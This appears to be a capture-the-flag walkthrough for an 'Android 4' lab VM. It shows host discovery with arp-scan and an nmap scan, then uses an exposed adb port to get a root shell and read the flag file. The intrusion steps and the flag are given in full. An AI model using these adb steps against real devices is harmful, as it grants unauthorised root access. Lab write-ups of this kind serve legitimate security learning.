# Android 4

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:12	(Unknown: locally administered)
192.168.56.100	08:00:27:89:31:c1	PCS Systemtechnik GmbH
192.168.56.126	08:00:27:21:14:3d	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.126`, let's enumerate it

### 2.Enumeration

```bash
root@kali: nmap -sT -sV -sC -v -p- -oN nmap.out 192.168.56.126
Nmap scan report for 192.168.56.126
Host is up (0.00068s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
5555/tcp  open  freeciv?
8080/tcp  open  http     PHP cli server 5.5 or later
|_http-title: Deface by Good Hackers
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
22000/tcp open  ssh      Dropbear sshd 2014.66 (protocol 2.0)
| ssh-hostkey: 
|   1024 b3:98:65:98:fd:c0:64:fe:16:d6:30:36:aa:2b:ef:6b (DSA)
|_  2048 19:e2:9e:6c:c6:8d:af:4e:86:7c:3b:60:91:33:e1:85 (RSA)
MAC Address: 08:00:27:21:14:3D (Oracle VirtualBox virtual NIC)
```

let's connect to port `5555` with adb and try to be root :

```bash
root@kali: adb connect 192.168.56.126
connected to 192.168.56.126:5555

root@kali: adb root           
adbd is already running as root

root@kali: adb shell      
uid=0(root) gid=0(root)@x86:/ # find / -iname flag.txt 2>/dev/null
/data/root/flag.txt

uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt
ANDROID{u_GOT_root_buddy}
```

this is how you can get root on this machine :)










